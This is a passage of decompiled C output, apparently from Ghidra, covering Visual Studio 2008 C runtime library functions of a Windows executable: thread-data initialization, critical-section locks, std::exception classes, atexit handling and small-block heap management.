    pcVar1 = (code *)__decode_pointer(DAT_0042bd14);
    (*pcVar1)(iVar2);
    DAT_0042a1c0 = -1;
  }
  if (DAT_0042a1c4 != 0xffffffff) {
    TlsFree(DAT_0042a1c4);
    DAT_0042a1c4 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2008 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_004222b0);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_004222b0);
  }
  _Ptd->_pxcptacttab = &DAT_00422ad8;
  _Ptd->_holdrand = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_EncodePointer_004222a0);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1d) = pFVar1;
    pFVar1 = GetProcAddress(hModule,s_DecodePointer_004222cc);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1f) = pFVar1;
  }
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_0042a790;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_0041293e();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_0042ad98;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_00412947();
  return;
}



void FUN_0041293e(void)

{
  FUN_00413064(0xd);
  return;
}



void FUN_00412947(void)

{
  FUN_00413064(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_0042a1c0;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_0042a1c0;
      p_Var5 = _Ptd;
      pcVar1 = (code *)__decode_pointer(DAT_0042bd10);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_00412afd(void)

{
  FUN_00413064(0xd);
  return;
}



void FUN_00412b09(void)

{
  FUN_00413064(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_004222b0);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_004222b0);
  }
  if (hModule != (HMODULE)0x0) {
    DAT_0042bd08 = GetProcAddress(hModule,s_FlsAlloc_004222fc);
    DAT_0042bd0c = GetProcAddress(hModule,s_FlsGetValue_004222f0);
    DAT_0042bd10 = GetProcAddress(hModule,s_FlsSetValue_004222e4);
    DAT_0042bd14 = GetProcAddress(hModule,s_FlsFree_004222dc);
    if ((((DAT_0042bd08 == (FARPROC)0x0) || (DAT_0042bd0c == (FARPROC)0x0)) ||
        (DAT_0042bd10 == (FARPROC)0x0)) || (DAT_0042bd14 == (FARPROC)0x0)) {
      DAT_0042bd0c = TlsGetValue_exref;
      DAT_0042bd08 = (FARPROC)&LAB_004127ef;
      DAT_0042bd10 = TlsSetValue_exref;
      DAT_0042bd14 = TlsFree_exref;
    }
    DAT_0042a1c4 = TlsAlloc();
    if (DAT_0042a1c4 == 0xffffffff) {
      return 0;
    }
    BVar1 = TlsSetValue(DAT_0042a1c4,DAT_0042bd0c);
    if (BVar1 == 0) {
      return 0;
    }
    __init_pointers();
    DAT_0042bd08 = (FARPROC)__encode_pointer((int)DAT_0042bd08);
    DAT_0042bd0c = (FARPROC)__encode_pointer((int)DAT_0042bd0c);
    DAT_0042bd10 = (FARPROC)__encode_pointer((int)DAT_0042bd10);
    DAT_0042bd14 = (FARPROC)__encode_pointer((int)DAT_0042bd14);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_004129e3;
      pcVar3 = (code *)__decode_pointer((int)DAT_0042bd08);
      DAT_0042a1c0 = (*pcVar3)(puVar5);
      if ((DAT_0042a1c0 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_0042a1c0;
        p_Var6 = _Ptd;
        pcVar3 = (code *)__decode_pointer((int)DAT_0042bd10);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
  }
  __mtterm();
  return 0;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  size_t sVar1;
  char *_Dst;
  
  *(undefined ***)this = &PTR_FUN_0042230c;
  if (*param_1 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar1 = _strlen(*param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,*param_1);
    }
  }
  *(undefined4 *)(this + 8) = 1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  char *pcVar1;
  
  *(undefined ***)this = &PTR_FUN_0042230c;
  pcVar1 = *param_1;
  *(undefined4 *)(this + 8) = 0;
  *(char **)(this + 4) = pcVar1;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  
  *(undefined ***)this = &PTR_FUN_0042230c;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)(this + 8) = iVar1;
  pcVar3 = *(char **)(param_1 + 4);
  if (iVar1 == 0) {
    *(char **)(this + 4) = pcVar3;
  }
  else if (pcVar3 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar2 = _strlen(pcVar3);
    pcVar3 = (char *)_malloc(sVar2 + 1);
    *(char **)(this + 4) = pcVar3;
    if (pcVar3 != (char *)0x0) {
      _strcpy_s(pcVar3,sVar2 + 1,*(char **)(param_1 + 4));
    }
  }
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall exception::~exception(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall exception::~exception(exception *this)

{
  *(undefined ***)this = &PTR_FUN_0042230c;
  if (*(int *)(this + 8) != 0) {
    _free(*(void **)(this + 4));
  }
  return;
}



exception * __thiscall FUN_00412d8f(void *this,byte param_1)

{
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00410837(this);
  }
  return (exception *)this;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = &PTR__scalar_deleting_destructor__0042232c;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_00410837(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2008 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __onexit_nolock(int param_1)

{
  int *_Memory;
  int *piVar1;
  size_t sVar2;
  size_t sVar3;
  void *pvVar4;
  int iVar5;
  
  _Memory = (int *)__decode_pointer(DAT_0042e8ac);
  piVar1 = (int *)__decode_pointer(DAT_0042e8a8);
  if ((piVar1 < _Memory) || (iVar5 = (int)piVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return 0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return 0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return 0;
      }
    }
    piVar1 = (int *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_0042e8ac = __encode_pointer((int)pvVar4);
  }
  iVar5 = __encode_pointer(param_1);
  *piVar1 = iVar5;
  DAT_0042e8a8 = __encode_pointer((int)(piVar1 + 1));
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2008 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_00413ef8();
  p_Var1 = (_onexit_t)__onexit_nolock((int)_Func);
  FUN_00412f22();
  return p_Var1;
}



void FUN_00412f22(void)

{
  FUN_00413f01();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



void __cdecl FUN_00412f3f(undefined4 param_1)

{
  DAT_0042bd18 = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2008 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)__decode_pointer(DAT_0042bd18);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_00422330;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_0042bd20;
  do {
    if ((&DAT_0042a1ec)[iVar2 * 2] == 1) {
      (&DAT_0042a1e8)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(&DAT_0042a1e8)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_0042a1e8)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_0042a1e8;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x42a308);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_0042a1e8;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x42a308);
  return;
}



void __cdecl FUN_00413064(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_0042a1e8)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION _Memory;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_0042be74 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_0042a1e8 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    _Memory = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (_Memory == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = ___crtInitCritSecAndSpinCount(_Memory,4000);
        if (BVar3 == 0) {
          _free(_Memory);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = _Memory;
        }
      }
      else {
        _free(_Memory);
      }
      FUN_00413135();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_00413135(void)

{
  FUN_00413064(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_0042a1e8)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_0042a1e8)[_File * 2]);
  return;
}



// Library Function - Single Match
//  ___sbh_find_block
// 
// Library: Visual Studio 2008 Release

uint __cdecl ___sbh_find_block(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_0042e8c0;
  while( true ) {
    if (DAT_0042e8bc * 0x14 + DAT_0042e8c0 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___sbh_free_block
// 
// Library: Visual Studio 2008 Release

void __cdecl ___sbh_free_block(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_0042be70 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_0042e8d0 * 0x8000 + DAT_0042be70[3]),0x8000,0x4000);
        DAT_0042be70[2] = DAT_0042be70[2] | 0x80000000U >> ((byte)DAT_0042e8d0 & 0x1f);
        *(undefined4 *)(DAT_0042be70[4] + 0xc4 + DAT_0042e8d0 * 4) = 0;
        *(char *)(DAT_0042be70[4] + 0x43) = *(char *)(DAT_0042be70[4] + 0x43) + -1;
        if (*(char *)(DAT_0042be70[4] + 0x43) == '\0') {
          DAT_0042be70[1] = DAT_0042be70[1] & 0xfffffffe;
        }
        if (DAT_0042be70[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_0042be70[3],0,0x8000);
          HeapFree(DAT_0042be74,0,(LPVOID)DAT_0042be70[4]);
          _memmove(DAT_0042be70,DAT_0042be70 + 5,
                   (DAT_0042e8bc * 0x14 - (int)DAT_0042be70) + -0x14 + DAT_0042e8c0);
          DAT_0042e8bc = DAT_0042e8bc + -1;
          if (DAT_0042be70 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_0042e8c8 = DAT_0042e8c0;
        }
      }
      DAT_0042be70 = param_1;
      DAT_0042e8d0 = uVar14;
    }
  }
  return;
}



// Library Function - Single Match
//  ___sbh_alloc_new_region
// 
// Library: Visual Studio 2008 Release

undefined4 * ___sbh_alloc_new_region(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_0042e8bc == DAT_0042e8cc) {
    pvVar1 = HeapReAlloc(DAT_0042be74,0,DAT_0042e8c0,(DAT_0042e8cc + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_0042e8cc = DAT_0042e8cc + 0x10;
    DAT_0042e8c0 = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_0042e8bc * 0x14 + (int)DAT_0042e8c0);
  pvVar1 = HeapAlloc(DAT_0042be74,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_0042e8bc = DAT_0042e8bc + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_0042be74,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



// Library Function - Single Match
//  ___sbh_alloc_new_group
// 
// Library: Visual Studio 2008 Release

int __cdecl ___sbh_alloc_new_group(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



// Library Function - Single Match
//  ___sbh_resize_block
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___sbh_resize_block(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
